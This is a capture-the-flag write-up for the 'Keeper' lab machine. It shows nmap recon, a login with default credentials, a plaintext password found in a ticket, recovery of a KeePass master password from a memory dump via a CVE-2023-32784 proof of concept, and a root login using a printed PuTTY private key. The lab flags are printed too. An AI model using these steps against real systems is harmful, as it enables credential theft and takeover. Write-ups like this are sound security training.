# CTF Writeup: Keeper

## Lab Description

Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With `SSH` access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the `Keepass` database, we can access the root `SSH` keys, which are used to gain a privileged shell on the host. 

---

## Reconaissance

An initial scan on the target reveals the following information about running services:

```
nmap -A -p- --min-rate 10000 10.129.229.41  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 14:58 EDT
Nmap scan report for 10.129.229.41
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   45.20 ms 10.10.14.1
2   45.36 ms 10.129.229.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
```

Since only ssh & http are open, we will start enumerating the running webpage.

Analyzing the webpage itself, there is only an link which redirects us to "tickets.keeper.htb/rt/"

```
To raise an IT support ticket, please visit tickets.keeper.htb/rt/
```

Let's map this subdomain to our target ip in our local dns file /etc/hosts

```
sudo echo "10.129.229.41 tickets.keeper.htb" | sudo tee -a /etc/hosts
```

## Initial Access


When pressing on the link we are getting forwarded to http://tickets.keeper.htb/rt/
The webpage itself is an login page for an application called "Request Tracker".
The Version of the Application is Request Tracker 4.4.4

Before bruteforcing or checking for any possible vulnerabilities on the webpage. Let's check for default credentials for the application. --> Found root:password from google.

Logged in successfully. Let's enumerate or find a way to gain initial access.

We were able to enumerate 2 users from the page. Inoorgard is connected to keeper.htb via ssh.
When pressing on the user, we can see the password of his within the comment section!

```
lnorgaard:Welcome2023!
```

Logged in successfuly via ssh.

```
ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$
```

## Privilege Escalation


Enumerated users on the target server.

```
root:x:0:0:root:/root:/bin/bash
lnorgaard:x:1000:1000:lnorgaard,,,:/home/lnorgaard:/bin/bash
```

Retrieved user.txt flag in /home/lnorgaard

```
5123f0de0314a80d5da2979eb3c2476f
```

There is an .zip file called "RT30000.zip" owned by root within the /home/lnorgaard directory.

Let's unzip it!

```
unzip RT30000.zip
```

We retrieved an .kdbx file & an .dmp file.

```
scp passcodes.kdbx lnorgaard@keeper.htb:"/home/lnoargaard"
```

There is an tool called kdbx2john which allows us to convert .kdbx files into .hash files, we can then utilize john the ripper to potentially brute-force an user password.


```
python3 keepass2john.py ../../Exploiting/OSCP_Prep/HTB/Keeper/passcodes.kdbx > passcodes.hash
```

Unfortunately we weren't able to enumerate the passphrase for the .kdbx file.

```
john passcode.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

After making some research, the .kdbx and .dmp file are vulnerable to CVE-2023-32784. We decided to search up for some crafted PoC's which we can abuse for this specifically.

```
https://github.com/vdohney/keepass-password-dumper
```

Downloaded the PoC locally and tried to run it in an PowerShell Shell.

```
┌──(saitama㉿kali)-[/home/saitama/Desktop/Exploiting/OSCP_Prep/HTB/Keeper/keepass-password-dumper]
└─PS> dotnet run ../KeePassDumpFull.dmp
/usr/share/dotnet/sdk/6.0.400/Sdks/Microsoft.NET.Sdk/targets/Microsoft.NET.TargetFrameworkInference.targets(144,5): error NETSDK1045: The current .NET SDK does not support targeting .NET 7.0.  Either target .NET 6.0 or lower, or use a version of the .NET SDK that supports .NET 7.0. [/home/saitama/Desktop/Exploiting/OSCP_Prep/HTB/Keeper/keepass-password-dumper/keepass_password_dumper.csproj]

The build failed. Fix the build errors and run again.
```

Unfortunately it didn't work because our versions weren't aligning.

In order to fix this issue I downloaded the dotnet-install.sh script and downloaded the version 7.0 which we need to run the .dmp file.

```
wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh
--2025-10-19 16:33:38--  https://dot.net/v1/dotnet-install.sh
Resolving dot.net (dot.net)... 20.76.201.171, 20.70.246.20, 20.231.239.246, ...
Connecting to dot.net (dot.net)|20.76.201.171|:443... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://builds.dotnet.microsoft.com/dotnet/scripts/v1/dotnet-install.sh [following]
--2025-10-19 16:33:38--  https://builds.dotnet.microsoft.com/dotnet/scripts/v1/dotnet-install.sh
Resolving builds.dotnet.microsoft.com (builds.dotnet.microsoft.com)... 23.213.161.20, 23.213.161.23, 2a02:26f0:480:33::212:40cc, ...
Connecting to builds.dotnet.microsoft.com (builds.dotnet.microsoft.com)|23.213.161.20|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/octet-stream]
Saving to: ‘dotnet-install.sh’

dotnet-install.sh               [ <=>                                        ]  62.15K  --.-KB/s    in 0.001s  

2025-10-19 16:33:39 (113 MB/s) - ‘dotnet-install.sh’ saved [63644]
```

Note: chmod+x the .sh script before running the command

```
./dotnet-install.sh --channel 7.0
dotnet-install: Attempting to download using aka.ms link https://builds.dotnet.microsoft.com/dotnet/Sdk/7.0.410/dotnet-sdk-7.0.410-linux-x64.tar.gz
dotnet-install: Remote file https://builds.dotnet.microsoft.com/dotnet/Sdk/7.0.410/dotnet-sdk-7.0.410-linux-x64.tar.gz size is 218499912 bytes.
dotnet-install: Extracting archive from https://builds.dotnet.microsoft.com/dotnet/Sdk/7.0.410/dotnet-sdk-7.0.410-linux-x64.tar.gz
dotnet-install: Downloaded file size is 218499912 bytes.
dotnet-install: The remote and local file sizes are equal.
dotnet-install: Installed version is 7.0.410
dotnet-install: Adding to current process PATH: `/root/.dotnet`. Note: This change will be visible only when sourcing script.
dotnet-install: Note that the script does not resolve dependencies during installation.
dotnet-install: To check the list of dependencies, go to https://learn.microsoft.com/dotnet/core/install, select your operating system and check the "Dependencies" section.
dotnet-install: Installation finished successfully.
```

This didn't work aswell, so I decided to change the exploit's version or "<TargetFramework>" parameter
from 7.0 to 6.0.

```
nano keepass_password_dumper.csproj
```

Now I was able to run the command.

```
dotnet run KeePassDumpFull.dmp > dump
```

We now got the potential passphrase for the .kdbx file.

```
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
3.:     d, 
4.:     g, 
5.:     r, 
6.:     ø, 
7.:     d, 
8.:      , 
9.:     m, 
10.:    e, 
11.:    d, 
12.:     , 
13.:    f, 
14.:    l, 
15.:    ø, 
16.:    d, 
17.:    e, 
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

the final passphrase is: rødgrød med fløde
Unfortunately the tool had some encoding issues, so we weren't able to check the char at position 1, but prompting the following output in AI/LLM will prompt us with the passphrase.

Logging into the .kdbx file

```
keepassxc passcodes.kdbx
```

We are able to enumerate the root ssh-rsa key for an "PuTTy User" called root.

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

My initiative is to convert the putty key into an openssh key, since this is owned by root.
We can utilize the preinstalled tool in kali linux "puttygen" for this

```
puttygen root.ppk -o private-openssh -o id_rsa  
puttygen: this command would perform no useful action
```

This command worked, it's important to specify the private-openssh key with -O not -o.

```
puttygen root.ppk -O private-openssh -o id_rsa
```

Logged in as root on the target.

```
ssh -i id_rsa root@keeper.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~#
```


Retrieved root.txt in /root directory.

```
8527a0bd62ac8ae797d2ccfe0955aa91
```
